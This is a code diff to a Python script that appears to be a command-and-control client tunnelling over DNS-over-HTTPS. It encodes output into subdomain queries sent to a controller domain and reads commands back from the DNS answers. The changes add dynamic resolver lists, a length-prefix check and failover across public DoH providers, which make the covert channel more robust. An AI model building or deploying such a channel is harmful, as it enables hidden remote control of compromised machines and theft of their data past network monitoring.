@@ -6,11 +6,18 @@ import requests
 import queue
 import base64
 import time
+from dohfinder import get_doh_providers
 
 try:
     from dnslib import DNSRecord, DNSQuestion, QTYPE
     WIREFORMAT = True
-    dnsproviders = ["https://cloudflare-dns.com/dns-query?dns=%DOMAIN"]
+    try: #build list dynmaically 
+        dnsproviders = []
+        for each in get_doh_providers():
+            dnsproviders.append(each["url"] + "?dns=%DOMAIN")  #not all of them support this method
+    except: #if error just use cloud flare
+        print('Using hard coded cloudflare')
+        dnsproviders = ["https://cloudflare-dns.com/dns-query?dns=%DOMAIN"]
     headers = {"accept" : "application/dns-message"}
 except:
     print("If you want to support all DoH providers you'll need to install dnslib")
@@ -24,7 +31,7 @@ senddns = "send.reyals.net"  #use your own domian send.example.com
 
 maxlength = 63  #maxium length of a subdomain
 sizeforsubdomains = 253 - len("." + senddns) #253 is max length of a full domain name
-maxsize = sizeforsubdomains - int(sizeforsubdomains/maxlength) # we need to subtract all space used by . so we wend up with something like 63.63.63.44.send.example.com
+maxsize = sizeforsubdomains - int(sizeforsubdomains/maxlength) - 3 # we need to subtract all space used by . so we wend up with something like 63.63.63.44.send.example.com also including 3 chars for a length variable
 maxbytesize = int((maxsize / 1.6) - ((maxsize / 1.6) % 5))  #taking account of the overhead of base32, what's the most data we can put in one query
 
 def addouttoque(out, que):
@@ -49,12 +56,9 @@ def processqueue(inque,outque):
     if len(buffer) == 0: #nothing to send
         return buffer
     answer = base64.b32encode(buffer).replace(b"=", b"")  #base 32 encode it and trim any = padding
-
+    answer = (str(len(answer) + 3).zfill(3)).encode() + answer #add the length of the message to start of domains so we can weed out BS queries
     #break the answer up so none of the subdomains are longer then maxlength
     subdomains = round(len(answer)/maxlength - .5)
-    if subdomains == 0: #we need to always have two subdomains to deal with providers issuing extra requests
-        halfway = round(len(answer)/2) #will always be at least 2 characters long
-        answer = answer[0:halfway] + b"." + answer[halfway:]
     for i in range(1, subdomains + 1):
         answer = answer[0:i*maxlength] + b"." + answer[i*maxlength:]
     return answer.lower()
@@ -91,17 +95,26 @@ while 1:
         query = base64.b64encode(temp.pack()).decode("ascii") #and base64 encode it for GET request
     else:
         query = domaintoquery
-    resp = requests.get(dnsproviders[round(time.time())%len(dnsproviders)].replace("%DOMAIN", query), headers = headers)
-
-    try:
-        if WIREFORMAT:
-            command = (DNSRecord.parse(resp.content).rr.pop().rdata.data[0]).decode("ascii")
-        else:
-            command = resp.json()["Answer"][0]["data"].strip('"')
-    except:  #something wrong with the response received, possibly server down
-        command = "ACK"
-        print(resp.text)
-
+    while True:
+        if len(dnsproviders) == 0:
+            raise Exception("Out of Providers")
+        try:
+            provider = dnsproviders[round(time.time())%len(dnsproviders)]
+            resp = requests.get(provider.replace("%DOMAIN", query), headers = headers)
+            if resp.status_code != 200:
+                raise Exception("Provider doesnt like us")
+            if WIREFORMAT:
+                if len(DNSRecord.parse(resp.content).rr) == 0:
+                    raise Exception("Not the answer I was expecting")  #server could be down... but I'm going to assume it's their fault
+                command = (DNSRecord.parse(resp.content).rr.pop().rdata.data[0]).decode("ascii")
+            else:
+                if not 'Answer' in resp.json():
+                    raise Exception("Not the answer I was expecting")  #server could be down... but I'm going to assume it's their fault
+                command = resp.json()["Answer"][0]["data"].strip('"')
+            break
+        except:
+            print("Error from " + dnsproviders.pop(dnsproviders.index(provider)) + " removing them")
+    
     if command == "ACK": #no action to take
         continue
 
